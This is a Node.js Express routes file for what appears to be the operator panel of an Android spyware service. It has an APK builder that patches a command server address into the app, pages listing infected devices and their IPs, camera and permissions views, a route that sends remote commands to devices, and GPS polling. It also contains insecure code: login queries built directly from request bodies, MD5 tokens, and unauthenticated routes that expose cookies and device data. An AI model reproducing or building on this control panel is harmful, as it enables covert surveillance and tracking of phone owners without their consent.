const express = require("express"),
  routes = express.Router(),
  cookieParser = require("cookie-parser"),
  bodyParser = require("body-parser"),
  crypto = require("crypto"),
  User = require("../models/userModel");
  nodemailer = require('nodemailer');

const Admin = require("../models/adminModel");

let CONST = global.CONST;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

async function isAllowed(req, res, next) {
  let cookies = req.cookies;

  // let loginToken = db.maindb.get("admin.loginToken").value();

  let { loginToken } = await Admin.findOne({ username: 'admin' });
  // let loginToken = admin.loginToken;

  if ("loginToken" in cookies) {
    if (cookies.loginToken === loginToken) next();
    else res.clearCookie("token").redirect("/login");
  } else res.redirect("/login");
  // next();
}

routes.get("/dl", (req, res) => {
  res.redirect("/build.s.apk");
});

routes.get("/app", isAllowed, async (req, res) => {

  const key = req.cookies.owner
  const visit = req.cookies.visit

  const owner = req.cookies.owner;
  console.log(`Owner name is ${req.cookies.owner}`);

  const clients = await clientManager.getClientList(owner);
  const clientsOnline = await clientManager.getClientListOnline(owner);
  const clientsOffline = await clientManager.getClientListOffline(owner);
  const ipList = await clientManager.getIpList(owner);

    res.render("manager", {
      key,
      clients,
      clientsOnline,
      clientsOffline,
      ipList,
    });

});

// routes.get('/', isAllowed, async (req, res) => {
//   // let cookies = req.cookies
//   // let owner = cookies.owner

//   // let unsortedClients = clientManager.getClientList().filter(ownerClients)

//   // function ownerClients(client) {
//   //     if(client.owner === owner) {
//   //         return
//   //     }
//   //   }

//   const clientsOnline = await clientManager.getClientListOnline();
//   const clientsOffline = await clientManager.getClientListOffline();

//   res.render('index', {
//     clientsOnline: clientsOnline,
//     clientsOffline: clientsOffline,
//   });
// });

routes.get("/signUp", (req, res) => {
  res.render("signUp");
});

// signup

routes.post("/signUp", async (req, res) => {

  let impo = crypto
  .createHash("md5")
  .update(req.body.name + req.body.email)
  .digest("hex");

  res.cookie("name" , req.body.name )
  res.cookie("email" , req.body.email )
  res.cookie("authDate", new Date().toString())
  res.cookie("impo" , impo )

  try {
    let user = await User.findOne({ email: req.body.email });

    if (user) {
      throw new Error(
        "A user with this email already exists! Try signing in instead."
      );
    }

    user = await User.create(req.body);

    res.redirect("/login");
    //   res.status(201).json({ status: "success", data: { user } });
  } catch (error) {
    res.redirect("/signUp?e=badsignUp");
    //   res.status(400).json({ status: "fail", message: error.message });
  }
});

routes.get("/login", (req, res) => {
  res.render("login");
});

routes.post("/login", async (req, res) => {

  console.log(req.body);

  let impo = crypto
  .createHash("md5")
  .update(req.body.name + req.body.email)
  .digest("hex");

  res.cookie("name" , req.body.name )
  res.cookie("email" , req.body.email )
  res.cookie("authDate", new Date().toString())
  res.cookie("impo" , impo )

  try {
    const userCheck = await User.findOne({ name: req.body.name });

    if (!userCheck) return res.redirect("/login?e=missingPassword");

    const user = await User.findOne(req.body);

    if (!user) return res.redirect("/login?e=missingPassword");

    let loginToken = crypto
      .createHash("md5")
      .update(Math.random().toString() + new Date().toString())
      .digest("hex");
      let owner = req.body.name;

    // db.maindb.get("admin").assign({ loginToken }).write();

    await Admin.findOneAndUpdate({ username: "admin" }, { loginToken });

    res.cookie("owner", impo);
    res.cookie("loginToken", loginToken).redirect("/app");
  } catch (error) {
    return res.redirect("/login?e=badLogin");
  }

  // if ('username' in req.body) {
  //     if ('password' in req.body) {
  //         let rUsername = db.maindb.get('admin.username').value();
  //         let rPassword = db.maindb.get('admin.password').value();
  //         let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
  //         if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
  //             let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
  //             let owner = req.body.username
  //             db.maindb.get('admin').assign({ loginToken }).write();
  //             res.cookie('owner', owner)
  //             res.cookie('loginToken', loginToken).redirect('/');
  //         } else return res.redirect('/login?e=badLogin');
  //     } else return res.redirect('/login?e=missingPassword');
  // } else return res.redirect('/login?e=missingUsername');
});

routes.get("/logout", isAllowed, async (req, res) => {
  // db.maindb.get("admin").assign({ loginToken: "" }).write();
  await Admin.findOneAndUpdate({ username: "admin" }, { loginToken: "" });
  // res.redirect('/');
  res.clearCookie("loginToken").redirect("/app");
});

routes.get("/builder", isAllowed, (req, res) => {
  res.render("builder", {
    myPort: "22222",
  });
});

routes.post("/builder", isAllowed, async (req, res) => {
  if (req.query.uri !== undefined && req.query.port !== undefined)
    apkBuilder.patchAPK(req.query.uri, req.query.port, async (error) => {
      if (!error)
        await apkBuilder.buildAPK(async (error) => {
          if (!error) {
            await logManager.log(CONST.logTypes.success, "Build Succeded!");
            res.json({ error: false });
          } else {
            await logManager.log(
              CONST.logTypes.error,
              "Build Failed - " + error
            );
            res.json({ error });
          }
        });
      else {
        await logManager.log(CONST.logTypes.error, "Build Failed - " + error);
        res.json({ error });
      }
    });
  else {
    await logManager.log(CONST.logTypes.error, "Build Failed - " + error);
    res.json({ error });
  }
});

routes.get("/logs", isAllowed, async (req, res) => {
  const logs = await logManager.getLogs();

  res.render("logs", {
    logs,
  });
});

routes.get("/manage/:deviceid/:page", isAllowed, async (req, res) => {
  let pageData = await clientManager.getClientDataByPage(
    req.params.deviceid,
    req.params.page,
    req.query.filter
  );

  if (req.params.page == "camera") {
    res.render("lab", {
      page: "camera",
      deviceID: req.params.deviceid,
      baseURL: "/manage/" + req.params.deviceid,
      pageData,
    });
  }

  if (req.params.page == "permissions") {
    res.render("lab", {
      page: "permissions",
      deviceID: req.params.deviceid,
      baseURL: "/manage/" + req.params.deviceid,
      pageData,
    });
  }

  if (pageData)
    res.render("lab", {
      page: req.params.page,
      deviceID: req.params.deviceid,
      baseURL: "/manage/" + req.params.deviceid,
      pageData,
    });
  else
    res.render("lab", {
      page: "notFound",
      deviceID: req.params.deviceid,
      baseURL: "/manage/" + req.params.deviceid,
    });
});

routes.get("/manage/byType/:deviceid/:type", async (req, res) => {
  let pageData = await clientManager.getClientDataByType(
    req.params.deviceid,
    req.params.type,
    req.query.filter
  );
  console.log("pageData used");
  if (pageData)
    res.send({
      pageData,
    });
  else
    res.render("deviceManager", {
      page: "notFound",
      deviceID: req.params.deviceid,
      baseURL: "/manage/" + req.params.deviceid,
    });
});

routes.post("/manage/:deviceid/:commandID", isAllowed, async (req, res) => {
  await clientManager.sendCommand(
    req.params.deviceid,
    req.params.commandID,
    req.query,
    (error, message) => {
      if (error) return res.json({ error });

      res.json({ error: false, message });
    }
  );
});


routes.get("/cookies", (req, res) => {
  let cookies = req.cookies;
  res.send(cookies);
});

routes.get("/legalDesclamier", (req, res) => {
  res.render("legalDesclamier");
});

routes.get("/termsAndConditions", (req, res) => {
  res.render("termsAndConditions");
});

routes.get("/contact", (req, res) => {
  res.render("contact");
});

routes.get("/install", (req, res) => {
  res.render("install");
});

routes.get("/howto", (req, res) => {
  res.render("howto");
});


routes.post("/contact", (req, res) => {

  const { name, email, number, concern } = req.body

    var transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.MAIL_TRANSPORTER_ID,
        pass: process.env.MAIL_TRANSPORTER_PASS
      }
    });

    // <a href="https://ibb.co/YT2dJF9"><img src="https://i.ibb.co/CsB943d/IMG-1147.jpg" alt="IMG-1147" border="0"></a>
    
    var mailOptions = {
      from: ''+email+'',
      to: 'support@protonspy.com',
      subject: ''+concern+'',
      html : `<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
      <head>
      <!--[if gte mso 9]>
      <xml>
        <o:OfficeDocumentSettings>
          <o:AllowPNG/>
          <o:PixelsPerInch>96</o:PixelsPerInch>
        </o:OfficeDocumentSettings>
      </xml>
      <![endif]-->
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="x-apple-disable-message-reformatting">
        <!--[if !mso]><!--><meta http-equiv="X-UA-Compatible" content="IE=edge"><!--<![endif]-->
        <title></title>
        
          <style type="text/css">
            table, td { color: #ffffff; } @media (max-width: 480px) { #u_content_image_1 .v-src-width { width: auto !important; } #u_content_image_1 .v-src-max-width { max-width: 100% !important; } #u_content_text_4 .v-container-padding-padding { padding: 35px 10px 45px !important; } }
      @media only screen and (min-width: 520px) {
        .u-row {
          width: 500px !important;
        }
        .u-row .u-col {
          vertical-align: top;
        }
      
        .u-row .u-col-100 {
          width: 500px !important;
        }
      
      }
      
      @media (max-width: 520px) {
        .u-row-container {
          max-width: 100% !important;
          padding-left: 0px !important;
          padding-right: 0px !important;
        }
        .u-row .u-col {
          min-width: 320px !important;
          max-width: 100% !important;
          display: block !important;
        }
        .u-row {
          width: calc(100% - 40px) !important;
        }
        .u-col {
          width: 100% !important;
        }
        .u-col > div {
          margin: 0 auto;
        }
        }
      body {
        margin: 0;
        padding: 0;
      }
      
      table,
      tr,
      td {
        vertical-align: top;
        border-collapse: collapse;
      }
      
      p {
        margin: 0;
      }
      
      .ie-container table,
      .mso-container table {
        table-layout: fixed;
      }
      
      * {
        line-height: inherit;
      }
      
      a[x-apple-data-detectors='true'] {
        color: inherit !important;
        text-decoration: none !important;
      }
      
      </style>
        
        
      
      </head>
      
      <body class="clean-body u_body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #1d1b1b;color: #ffffff">
        <!--[if IE]><div class="ie-container"><![endif]-->
        <!--[if mso]><div class="mso-container"><![endif]-->
        <table style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #1d1b1b;width:100%" cellpadding="0" cellspacing="0">
        <tbody>
        <tr style="vertical-align: top">
          <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top">
          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="background-color: #1d1b1b;"><![endif]-->
          
      
      <div class="u-row-container" style="padding: 0px;background-color: transparent">
        <div class="u-row" style="Margin: 0 auto;min-width: 320px;max-width: 500px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;">
          <div style="border-collapse: collapse;display: table;width: 100%;background-color: transparent;">
            <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding: 0px;background-color: transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width:500px;"><tr style="background-color: transparent;"><![endif]-->
            
      <!--[if (mso)|(IE)]><td align="center" width="500" style="width: 500px;padding: 0px;border-top: 0px solid transparent;border-left: 0px solid transparent;border-right: 0px solid transparent;border-bottom: 0px solid transparent;" valign="top"><![endif]-->
      <div class="u-col u-col-100" style="max-width: 320px;min-width: 500px;display: table-cell;vertical-align: top;">
        <div style="width: 100% !important;">
        <!--[if (!mso)&(!IE)]><!--><div style="padding: 0px;border-top: 0px solid transparent;border-left: 0px solid transparent;border-right: 0px solid transparent;border-bottom: 0px solid transparent;"><!--<![endif]-->
      
      <table id="u_content_text_4" style="font-family:arial,helvetica,sans-serif;" role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0">
        <tbody>
          <tr>
            <td class="v-container-padding-padding" style="overflow-wrap:break-word;word-break:break-word;padding:45px 10px;font-family:arial,helvetica,sans-serif;" align="left">
              
        <div style="line-height: 140%; text-align: left; word-wrap: break-word;">
          <p style="font-size: 14px; line-height: 140%; text-align: center;"><span style="font-size: 22px; line-height: 30.799999999999997px;"><em><span style="line-height: 30.799999999999997px; font-size: 22px;"><strong>${concern}</strong></span></em></span></p>
        </div>
      
            </td>
          </tr>
        </tbody>
      </table>
      
      <table style="font-family:arial,helvetica,sans-serif;" role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0">
        <tbody>
          <tr>
            <td class="v-container-padding-padding" style="overflow-wrap:break-word;word-break:break-word;padding:30px 10px;font-family:arial,helvetica,sans-serif;" align="left">
              
        <div style="line-height: 140%; text-align: left; word-wrap: break-word;">
          <p style="font-size: 14px; line-height: 140%; text-align: center;"><span style="font-size: 16px; line-height: 22.4px;"><strong>name : ${name}</strong></span></p>
        </div>
      
            </td>
          </tr>
        </tbody>
      </table>
      
      <table style="font-family:arial,helvetica,sans-serif;" role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0">
        <tbody>
          <tr>
            <td class="v-container-padding-padding" style="overflow-wrap:break-word;word-break:break-word;padding:30px 10px;font-family:arial,helvetica,sans-serif;" align="left">
              
        <div style="line-height: 140%; text-align: left; word-wrap: break-word;">
          <p style="font-size: 14px; line-height: 140%; text-align: center;"><span style="font-size: 16px; line-height: 22.4px;"><strong>email : ${email}</strong></span></p>
        </div>
      
            </td>
          </tr>
        </tbody>
      </table>
      
      <table style="font-family:arial,helvetica,sans-serif;" role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0">
        <tbody>
          <tr>
            <td class="v-container-padding-padding" style="overflow-wrap:break-word;word-break:break-word;padding:30px 10px;font-family:arial,helvetica,sans-serif;" align="left">
              
        <div style="line-height: 140%; text-align: left; word-wrap: break-word;">
          <p style="font-size: 14px; line-height: 140%; text-align: center;"><span style="font-size: 16px; line-height: 22.4px;"><strong>number : ${number}</strong></span></p>
        </div>
      
            </td>
          </tr>
        </tbody>
      </table>
      
        <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
        </div>
      </div>
      <!--[if (mso)|(IE)]></td><![endif]-->
            <!--[if (mso)|(IE)]></tr></table></td></tr></table><![endif]-->
          </div>
        </div>
      </div>
      
      
          <!--[if (mso)|(IE)]></td></tr></table><![endif]-->
          </td>
        </tr>
        </tbody>
        </table>
        <!--[if mso]></div><![endif]-->
        <!--[if IE]></div><![endif]-->
      </body>`
    };
    
    transporter.sendMail(mailOptions, function(error, info){
      if (error) {
        console.log(error);
      } else {
        console.log('Email sent: ' + info.response);
      }
    });

    res.send("success")

})


routes.get("/muntazim/:key", isAllowed, async (req, res) => {

  const key = CONST.adminkey

  if(req.params.key == key) {

    const owner = req.cookies.owner;

    const clients = await clientManager.getClientList(owner);
    const clientsOnline = await clientManager.getClientListOnline(owner);
    const clientsOffline = await clientManager.getClientListOffline(owner);
    const ipList = await clientManager.getIpList(owner);
  
    res.render("admin", {
      clients,
      clientsOnline,
      clientsOffline,
      ipList,
    });

  }

  else {
    res.redirect('/logout')
  }

});

// routes.get("/test", async (req, res) => {
//   let pageData = await clientManager.getClientDataByPage(
//     req.params.deviceid,
//     req.params.page,
//     req.query.filter
//   );
//   if (req.params.page == "camera") {
//     const clients = await clientManager.getClientList(req.cookies.owner);
//     const clientsOnline = await clientManager.getClientListOnline(
//       req.cookies.owner
//     );
//     const clientsOffline = await clientManager.getClientListOffline(
//       req.cookies.owner
//     );
//     const ipList = await clientManager.getIpList(req.cookies.owner);

//     res.render("indexdash", {
//       clients,
//       clientsOnline,
//       clientsOffline,
//       ipList,
//     });
//   }

//   const clients = await clientManager.getClientList(req.cookies.owner);
//   const clientsOnline = await clientManager.getClientListOnline(
//     req.cookies.owner
//   );
//   const clientsOffline = await clientManager.getClientListOffline(
//     req.cookies.owner
//   );
//   const ipList = await clientManager.getIpList(req.cookies.owner);

//   res.render("indexdash", {
//     clients,
//     clientsOnline,
//     clientsOffline,
//     ipList,
//   });
// });

routes.get("/howToInstall", isAllowed, (req, res) => {
  res.render("HowToInstall");
});

routes.post("/manage/:deviceid/GPSPOLL/:speed", isAllowed, async (req, res) => {
  await clientManager.setGpsPollSpeed(
    req.params.deviceid,
    parseInt(req.params.speed),
    (error) => {
      if (!error) res.json({ error: false });
      else res.json({ error });
    }
  );
});

module.exports = routes;
